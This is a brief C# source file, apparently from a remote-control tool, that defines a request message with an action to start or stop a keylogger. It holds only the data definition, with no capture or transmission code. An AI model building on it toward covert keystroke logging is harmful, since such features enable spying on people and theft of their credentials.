using System;

namespace RemoteControl.Protocals.Request
{
    public enum eKeyloggerAction
    {
        Start = 0,
        Stop
    }

    public class RequestKeylogger
    {
        public eKeyloggerAction Action;
    }
}
